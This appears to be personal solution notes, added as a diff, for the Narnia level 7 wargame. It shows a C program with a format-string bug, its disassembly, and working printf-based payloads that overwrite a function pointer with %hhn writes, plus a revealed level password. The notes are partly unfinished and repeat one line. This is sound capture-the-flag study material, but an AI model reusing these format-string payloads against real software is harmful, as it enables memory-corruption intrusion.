@@ -1,0 +1,61 @@
+narnia7@narnia:/narnia$ ./narnia7 foobar
+goodfunction() = 0x80492ea
+hackedfunction() = 0x804930f
+
+before : ptrf() = 0x80492ea (0xffffd318)
+I guess you want to come to the hackedfunction...
+Welcome to the goodfunction, but i said the Hackedfunction..
+
+int vuln(const char *format){
+        char buffer[128];
+        int (*ptrf)();
+
+        memset(buffer, 0, sizeof(buffer));
+        printf("goodfunction() = %p\n", goodfunction);
+        printf("hackedfunction() = %p\n\n", hackedfunction);
+
+        ptrf = goodfunction;
+        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);
+
+        printf("I guess you want to come to the hackedfunction...\n");
+        sleep(2);
+        ptrf = goodfunction;
+
+        snprintf(buffer, sizeof buffer, format);
+
+        return ptrf();
+}
+
+   0x08049282 <+124>:   movl   $0x80492ea,-0x84(%ebp)
+   0x0804928c <+134>:   push   0x8(%ebp)
+   0x0804928f <+137>:   push   $0x80
+   0x08049294 <+142>:   lea    -0x80(%ebp),%eax
+   0x08049297 <+145>:   push   %eax
+   0x08049298 <+146>:   call   0x80490e0 <snprintf@plt>
+
+Carefull! The addresses changes if you define another env variable
+This set the least signifianct byte
+gdb --args /narnia/narnia7 $(printf '\xd8\xd2\xff\xff%%11x%%hhn')
+TODO Extend to set the second least sign byte too
+gdb --args ./narnia7 $(printf '\xc8\xd2\xff\xff\xc9\xd2\xff\xff%%07x%%hhn%%132x%%3$hhn')
+Adjusting the address of ptrf when running outside of gdb based on the printout
+The quotes where necessary
+./narnia7 "$(printf '\x08\xd3\xff\xff\x09\xd3\xff\xff%%07x%%hhn%%132x%%3$hhn')"
+pw i1SQ81fkb8
+
+
+
+
+
+
+Tactic:
+Format string exploit
+The ptrf pointer is stored at 0xffffd318
+Then change it with %n in two 16-bit writes
+The following will modify the pointer (but not to the correct value):
+The following will modify the pointer (but not to the correct value):
+./narnia7 $(printf '\x18\xd3\xff\xff%%n')
+
+string is stored at 0xffffd5c0 which is 732 bytes above first argument at 0xffffd2e4
+732/4=183 offset +1 = 184
+44*4+
